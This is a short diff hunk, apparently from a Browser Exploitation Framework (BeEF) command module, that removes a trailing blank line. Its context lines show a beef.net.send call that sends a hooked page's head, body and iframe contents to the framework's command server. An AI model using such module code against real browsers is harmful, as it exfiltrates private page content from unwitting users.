@@ -33,4 +33,3 @@ beef.execute(function() {
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head+'&body='+html_body+'&iframe_='+iframe_);
 
 });
-
